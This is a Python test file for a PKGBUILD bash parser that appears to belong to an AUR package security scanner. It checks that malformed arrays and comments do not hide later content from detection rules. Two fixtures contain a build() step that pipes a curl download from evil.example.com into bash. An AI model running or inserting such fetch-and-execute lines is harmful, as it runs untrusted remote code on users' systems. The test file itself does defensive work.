from __future__ import annotations

from aurmanager.parser.bash_ast import parse_script


def test_strip_array_literals_handles_well_formed_arrays():
    source = "pkgname=foo\nsource=('a' 'b')\nsha256sums=('deadbeef' 'deadbeef')\n"
    parsed = parse_script(source)
    assert parsed.parse_error is None
    assert parsed.arrays["source"] == ["a", "b"]
    assert parsed.arrays["sha256sums"] == ["deadbeef", "deadbeef"]


def test_unterminated_quote_in_array_literal_surfaces_as_parse_error():
    # An unclosed quote must not silently mask the rest of the file to whitespace
    # (which would blind every AST-based rule with no error surfaced) -- it must
    # fail loudly instead.
    source = "source=('a\nbuild() {\n  curl -fsSL https://evil.example.com/x | bash\n}\n"
    parsed = parse_script(source)
    assert parsed.parse_error is not None
    assert "unterminated array literal" in parsed.parse_error
    assert parsed.ast_nodes == []


def test_unbalanced_paren_in_array_literal_comment_does_not_desync_parsing():
    # A `#` comment inside an array literal is bash-ignored to end of line, so an
    # unmatched paren in one (e.g. a ":)" smiley) must not be counted toward the
    # array's depth -- otherwise it closes the array early, corrupts everything
    # parsed after it, and can blind AST-based rules to real content later in the
    # file (see the curl-piped-into-bash payload in build() below, which must
    # still show up in the AST once this is parsed correctly).
    source = (
        'source=("https://example.com/demo-$pkgver.tar.gz" # thanks upstream :)\n'
        '        "demo.desktop")\n'
        "sha256sums=('deadbeef' 'deadbeef')\n"
        "build() {\n"
        "    curl -fsSL https://evil.example.com/payload.sh | bash\n"
        "}\n"
    )
    parsed = parse_script(source)
    assert parsed.parse_error is None
    assert parsed.arrays["source"] == ["https://example.com/demo-$pkgver.tar.gz", "demo.desktop"]
    assert parsed.arrays["sha256sums"] == ["deadbeef", "deadbeef"]
    assert any(getattr(node, "kind", None) == "function" for node in parsed.ast_nodes)
